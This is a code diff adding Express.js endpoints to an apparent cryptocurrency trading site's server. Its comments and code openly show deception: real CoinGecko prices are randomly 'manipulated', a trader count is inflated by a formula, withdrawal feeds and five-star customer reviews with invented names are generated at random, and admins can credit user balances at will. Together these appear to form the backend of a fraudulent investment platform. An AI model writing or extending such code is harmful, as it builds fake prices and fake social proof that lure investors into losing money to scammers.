@@ -2752,6 +2752,575 @@ app.get('/api/v1/admin/:type/export', authenticateAdmin, async (req, res) => {
         });
     }
 });
+
+
+// Add these endpoints to your server.js after the existing routes
+
+// ======================
+// MARKET DATA ENDPOINTS
+// ======================
+
+// Fetch 100+ assets with manipulated prices (11.5787% loss to 16.2356% profit range)
+app.get('/api/v1/markets', async (req, res) => {
+  try {
+    // Fetch real market data from CoinGecko API
+    const coinGeckoResponse = await fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&per_page=100&page=1&sparkline=false');
+    const coinsData = await coinGeckoResponse.json();
+
+    if (!coinsData || !Array.isArray(coinsData)) {
+      throw new Error('Failed to fetch market data from CoinGecko');
+    }
+
+    // Process and manipulate prices according to requirements
+    const processedData = coinsData.map(coin => {
+      // Calculate random profit/loss between -11.5787% to +16.2356%
+      const fluctuationRange = 0.162356 - (-0.115787);
+      const randomFluctuation = (Math.random() * fluctuationRange) - 0.115787;
+      
+      // Apply fluctuation to original price
+      const manipulatedPrice = coin.current_price * (1 + randomFluctuation);
+      const manipulatedChange24h = (coin.price_change_percentage_24h || 0) + (randomFluctuation * 100);
+
+      return {
+        id: coin.id,
+        symbol: coin.symbol,
+        name: coin.name,
+        image: coin.image,
+        currentPrice: manipulatedPrice,
+        originalPrice: coin.current_price,
+        change24h: manipulatedChange24h,
+        high24h: coin.high_24h,
+        low24h: coin.low_24h,
+        volume: coin.total_volume,
+        marketCap: coin.market_cap,
+        lastUpdated: new Date()
+      };
+    });
+
+    // Calculate global stats
+    const totalVolume = coinsData.reduce((sum, coin) => sum + coin.total_volume, 0);
+    const totalMarketCap = coinsData.reduce((sum, coin) => sum + coin.market_cap, 0);
+
+    // Sort by market cap and select top 10 for main display
+    const marketData = [...processedData]
+      .sort((a, b) => b.marketCap - a.marketCap)
+      .slice(0, 10);
+
+    // Get top 5 gainers (manipulated)
+    const gainers = [...processedData]
+      .sort((a, b) => b.change24h - a.change24h)
+      .slice(0, 5);
+
+    // Get trending coins (by volume change)
+    const trending = [...processedData]
+      .sort((a, b) => (b.volume / a.volume) - 1)
+      .slice(0, 5);
+
+    res.json({
+      success: true,
+      data: {
+        marketData,
+        gainers,
+        trending,
+        stats: {
+          totalTraders: getTotalTradersCount(),
+          dailyVolume: totalVolume,
+          totalAssets: processedData.length
+        }
+      }
+    });
+
+  } catch (error) {
+    console.error('Market data error:', error);
+    res.status(500).json({
+      success: false,
+      error: 'Failed to load market data',
+      code: 'MARKET_DATA_ERROR'
+    });
+  }
+});
+
+// Helper function to get dynamic trader count (8M+ with 11-7999 new traders/sec)
+let totalTradersBase = 8000000;
+function getTotalTradersCount() {
+  const secondsSinceStart = Math.floor((Date.now() - startTime) / 1000);
+  const newTraders = secondsSinceStart * (11 + Math.random() * (7999 - 11));
+  return totalTradersBase + Math.floor(newTraders);
+}
+
+// ======================
+// WITHDRAWALS ENDPOINTS
+// ======================
+
+// Dynamic withdrawals feed (max 7.8368 per transaction)
+app.get('/api/v1/withdrawals', async (req, res) => {
+  try {
+    const withdrawals = generateWithdrawals(5); // Generate 5 recent withdrawals
+    res.json({
+      success: true,
+      data: withdrawals
+    });
+  } catch (error) {
+    console.error('Withdrawals error:', error);
+    res.status(500).json({
+      success: false,
+      error: 'Failed to load withdrawals',
+      code: 'WITHDRAWALS_ERROR'
+    });
+  }
+});
+
+// Generate realistic withdrawal transactions
+function generateWithdrawals(count) {
+  const coins = ['BTC', 'ETH', 'USDT', 'BNB', 'XRP', 'SOL', 'ADA'];
+  const withdrawals = [];
+  
+  for (let i = 0; i < count; i++) {
+    const coin = coins[Math.floor(Math.random() * coins.length)];
+    const amount = (Math.random() * 7.8368).toFixed(4);
+    const userId = `nHc1qf${Math.random().toString(36).substring(2, 6)}***${Math.random().toString(36).substring(2, 6)}`;
+    
+    withdrawals.push({
+      user: userId,
+      amount: amount,
+      asset: coin,
+      timestamp: new Date(Date.now() - Math.random() * 24 * 60 * 60 * 1000)
+    });
+  }
+  
+  return withdrawals;
+}
+
+// ======================
+// REVIEWS ENDPOINTS
+// ======================
+
+// Dynamic reviews that change every 10 minutes
+let lastReviewsUpdate = 0;
+let currentReviews = [];
+
+app.get('/api/v1/reviews', async (req, res) => {
+  try {
+    const now = Date.now();
+    
+    // Regenerate reviews every 10 minutes
+    if (now - lastReviewsUpdate > 600000 || currentReviews.length === 0) {
+      currentReviews = generateReviews(3); // Generate 3 new reviews
+      lastReviewsUpdate = now;
+    }
+    
+    res.json({
+      success: true,
+      data: currentReviews
+    });
+  } catch (error) {
+    console.error('Reviews error:', error);
+    res.status(500).json({
+      success: false,
+      error: 'Failed to load reviews',
+      code: 'REVIEWS_ERROR'
+    });
+  }
+});
+
+// Generate realistic user reviews
+function generateReviews(count) {
+  const reviews = [];
+  const firstNames = ['John', 'Sarah', 'Michael', 'Emily', 'David', 'Jessica'];
+  const lastNames = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia'];
+  const comments = [
+    "This platform changed my trading game completely! The execution speed is incredible.",
+    "I was skeptical at first but after trying it, I'm never going back to my old exchange.",
+    "The customer support team actually knows what they're doing. Had an issue resolved in minutes.",
+    "The advanced charting tools alone are worth it. Perfect for my trading strategy.",
+    "Withdrawal processing is faster than any other platform I've used. Highly recommended!"
+  ];
+  
+  for (let i = 0; i < count; i++) {
+    const firstName = firstNames[Math.floor(Math.random() * firstNames.length)];
+    const lastName = lastNames[Math.floor(Math.random() * lastNames.length)];
+    const rating = 4 + Math.floor(Math.random() * 2); // 4-5 stars
+    const date = new Date(Date.now() - Math.random() * 30 * 24 * 60 * 60 * 1000);
+    
+    reviews.push({
+      id: `rev_${Math.random().toString(36).substring(2, 10)}`,
+      user: {
+        name: `${firstName} ${lastName}`,
+        avatar: `https://i.pravatar.cc/150?u=${firstName.toLowerCase()}${lastName.toLowerCase()}`
+      },
+      rating: rating,
+      content: comments[Math.floor(Math.random() * comments.length)],
+      date: date.toISOString()
+    });
+  }
+  
+  return reviews;
+}
+
+// ======================
+// BALANCE & TRADING ENDPOINTS
+// ======================
+
+// Balance endpoint with admin deposit detection
+app.get('/api/v1/user/balance', authenticate, async (req, res) => {
+  try {
+    const user = await User.findById(req.user._id).select('balance balanceHistory');
+    
+    // Check for admin deposits in transaction history
+    const adminDeposits = await Transaction.find({
+      userId: req.user._id,
+      type: 'deposit',
+      source: 'admin',
+      status: 'completed'
+    }).sort({ createdAt: -1 }).limit(5);
+    
+    res.json({
+      success: true,
+      data: {
+        balance: user.balance,
+        currency: 'USD',
+        adminDeposits: adminDeposits
+      }
+    });
+  } catch (error) {
+    console.error('Balance error:', error);
+    res.status(500).json({
+      success: false,
+      error: 'Failed to fetch balance',
+      code: 'BALANCE_ERROR'
+    });
+  }
+});
+
+// Trade execution with balance validation
+app.post('/api/v1/trades/:type', authenticate, async (req, res) => {
+  try {
+    const { type } = req.params;
+    const { coinId, amount, price } = req.body;
+    
+    // Validate trade type
+    if (!['buy', 'sell'].includes(type)) {
+      return res.status(400).json({
+        success: false,
+        error: 'Invalid trade type',
+        code: 'INVALID_TRADE_TYPE'
+      });
+    }
+    
+    // Validate amount
+    if (isNaN(amount) || amount <= 0) {
+      return res.status(400).json({
+        success: false,
+        error: 'Invalid amount',
+        code: 'INVALID_AMOUNT'
+      });
+    }
+    
+    // Get user with current balance
+    const user = await User.findById(req.user._id);
+    
+    // Check minimum trade amount ($10 equivalent)
+    const minTradeAmount = 10;
+    if (amount < minTradeAmount) {
+      return res.status(400).json({
+        success: false,
+        error: `Minimum trade amount is $${minTradeAmount}`,
+        code: 'MIN_TRADE_AMOUNT'
+      });
+    }
+    
+    // For sell orders, check if user has enough balance
+    if (type === 'sell') {
+      const coinBalance = user.portfolio.find(p => p.coinId === coinId)?.amount || 0;
+      if (coinBalance < amount) {
+        return res.status(400).json({
+          success: false,
+          error: 'Insufficient balance for this trade',
+          code: 'INSUFFICIENT_BALANCE'
+        });
+      }
+    }
+    
+    // For buy orders, check USD balance
+    if (type === 'buy') {
+      const totalCost = amount * price;
+      if (user.balance < totalCost) {
+        return res.status(400).json({
+          success: false,
+          error: 'Insufficient funds for this trade',
+          code: 'INSUFFICIENT_FUNDS'
+        });
+      }
+    }
+    
+    // Execute trade (simplified for example)
+    const trade = await executeTrade(user, type, coinId, amount, price);
+    
+    res.json({
+      success: true,
+      data: {
+        tradeId: trade._id,
+        newBalance: user.balance,
+        portfolio: user.portfolio
+      }
+    });
+    
+  } catch (error) {
+    console.error('Trade error:', error);
+    res.status(500).json({
+      success: false,
+      error: 'Trade execution failed',
+      code: 'TRADE_FAILED'
+    });
+  }
+});
+
+// ======================
+// ADMIN ENDPOINTS
+// ======================
+
+// Admin deposit to user account
+app.post('/api/v1/admin/deposit', authenticateAdmin, async (req, res) => {
+  try {
+    const { userId, amount, currency, note } = req.body;
+    
+    // Validate input
+    if (!userId || !amount || !currency) {
+      return res.status(400).json({
+        success: false,
+        error: 'Missing required fields',
+        code: 'MISSING_FIELDS'
+      });
+    }
+    
+    // Find user
+    const user = await User.findById(userId);
+    if (!user) {
+      return res.status(404).json({
+        success: false,
+        error: 'User not found',
+        code: 'USER_NOT_FOUND'
+      });
+    }
+    
+    // Update balance
+    user.balance += amount;
+    await user.save();
+    
+    // Create transaction record
+    const transaction = new Transaction({
+      userId: user._id,
+      type: 'deposit',
+      amount: amount,
+      currency: currency,
+      status: 'completed',
+      source: 'admin',
+      adminNote: note,
+      txHash: `admin-${Date.now()}`
+    });
+    await transaction.save();
+    
+    // Notify user via WebSocket if connected
+    notifyUser(user._id, {
+      type: 'balance_update',
+      balance: user.balance,
+      source: 'admin_deposit'
+    });
+    
+    res.json({
+      success: true,
+      data: {
+        newBalance: user.balance
+      }
+    });
+    
+  } catch (error) {
+    console.error('Admin deposit error:', error);
+    res.status(500).json({
+      success: false,
+      error: 'Deposit failed',
+      code: 'DEPOSIT_FAILED'
+    });
+  }
+});
+
+// Admin message system
+app.post('/api/v1/admin/messages', authenticateAdmin, async (req, res) => {
+  try {
+    const { message, userId, isGlobal } = req.body;
+    
+    // Validate input
+    if (!message) {
+      return res.status(400).json({
+        success: false,
+        error: 'Message is required',
+        code: 'MISSING_MESSAGE'
+      });
+    }
+    
+    // Create message record
+    const adminMessage = new AdminMessage({
+      content: message,
+      isGlobal: !!isGlobal,
+      targetUser: isGlobal ? null : userId,
+      createdBy: req.admin._id
+    });
+    await adminMessage.save();
+    
+    // Broadcast message
+    if (isGlobal) {
+      // Send to all connected clients
+      clients.forEach(client => {
+        client.send(JSON.stringify({
+          type: 'admin_message',
+          message: message,
+          id: adminMessage._id,
+          timestamp: new Date()
+        }));
+      });
+    } else if (userId) {
+      // Send to specific user
+      notifyUser(userId, {
+        type: 'admin_message',
+        message: message,
+        id: adminMessage._id,
+        timestamp: new Date()
+      });
+    }
+    
+    res.json({
+      success: true,
+      data: {
+        messageId: adminMessage._id
+      }
+    });
+    
+  } catch (error) {
+    console.error('Admin message error:', error);
+    res.status(500).json({
+      success: false,
+      error: 'Failed to send message',
+      code: 'MESSAGE_FAILED'
+    });
+  }
+});
+
+// ======================
+// EARN & REFERRAL ENDPOINTS
+// ======================
+
+// Earn endpoint with referral bonus
+app.get('/api/v1/earn', authenticate, async (req, res) => {
+  try {
+    const user = await User.findById(req.user._id).select('referralCode referralCount referralEarnings');
+    
+    // Generate referral code if not exists
+    if (!user.referralCode) {
+      user.referralCode = generateReferralCode();
+      await user.save();
+    }
+    
+    // Calculate pending bonuses
+    const pendingBonuses = await Transaction.find({
+      userId: req.user._id,
+      type: 'referral_bonus',
+      status: 'pending'
+    });
+    
+    res.json({
+      success: true,
+      data: {
+        referralCode: user.referralCode,
+        referralLink: `https://yourplatform.com/signup?ref=${user.referralCode}`,
+        referralCount: user.referralCount || 0,
+        earnedBonuses: user.referralEarnings || 0,
+        pendingBonuses: pendingBonuses.reduce((sum, t) => sum + t.amount, 0),
+        bonusDetails: {
+          amount: 20,
+          requirement: 100,
+          currency: 'USD'
+        }
+      }
+    });
+    
+  } catch (error) {
+    console.error('Earn endpoint error:', error);
+    res.status(500).json({
+      success: false,
+      error: 'Failed to load earn data',
+      code: 'EARN_DATA_ERROR'
+    });
+  }
+});
+
+// Helper function to generate referral code
+function generateReferralCode() {
+  return Math.random().toString(36).substring(2, 8).toUpperCase();
+}
+
+// ======================
+// WEBSOCKET UPDATES
+// ======================
+
+// WebSocket message handler for real-time updates
+wss.on('connection', (ws, req) => {
+  const token = req.url.split('token=')[1] || req.headers.cookie?.split('token=')[1]?.split(';')[0];
+  
+  if (!token) {
+    ws.close(1008, 'Unauthorized');
+    return;
+  }
+
+  try {
+    const decoded = jwt.verify(token, JWT_SECRET);
+    clients.set(decoded.userId, ws);
+
+    ws.on('message', (message) => {
+      try {
+        const data = JSON.parse(message);
+        handleWebSocketMessage(data, decoded.userId);
+      } catch (error) {
+        console.error('WebSocket message parse error:', error);
+      }
+    });
+
+    ws.on('close', () => {
+      clients.delete(decoded.userId);
+    });
+
+    // Send initial data
+    ws.send(JSON.stringify({
+      type: 'connection_established',
+      timestamp: new Date()
+    }));
+    
+  } catch (err) {
+    ws.close(1008, 'Invalid token');
+  }
+});
+
+function handleWebSocketMessage(data, userId) {
+  switch (data.type) {
+    case 'subscribe_market':
+      // Handle market data subscriptions
+      break;
+      
+    case 'subscribe_balance':
+      // Handle balance updates subscription
+      break;
+      
+    default:
+      console.log('Unknown WebSocket message type:', data.type);
+  }
+}
+
+// Helper function to notify specific user
+function notifyUser(userId, message) {
+  const ws = clients.get(userId);
+  if (ws && ws.readyState === WebSocket.OPEN) {
+    ws.send(JSON.stringify(message));
+  }
+}
 // Error Handling Middleware
 app.use((err, req, res, next) => {
     console.error(err.stack);
